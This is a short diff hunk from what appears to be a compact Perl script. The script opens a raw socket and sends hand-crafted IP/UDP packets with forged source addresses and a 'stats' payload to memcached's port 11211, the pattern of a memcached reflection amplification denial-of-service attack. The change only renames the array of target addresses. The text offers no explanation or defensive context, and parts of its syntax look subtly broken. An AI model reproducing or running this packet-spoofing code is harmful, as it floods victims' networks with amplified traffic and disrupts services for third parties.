@@ -24,7 +24,7 @@ Use Socket;socket R,
 2,3,255;setsockopt R, 0,1,1;send
 R,pack("H*x4H*a4a4h*Z*",
 45000019,"52110000",
-(map{inet_aton$_}@Argv),
+(map{inet_aton$_}@x0x0),
 "fefe2bcb0017"."0"x14,"\x01\x00\x00stats\r\n"),0,pack"Sna4x8",2,60,pop
 
 
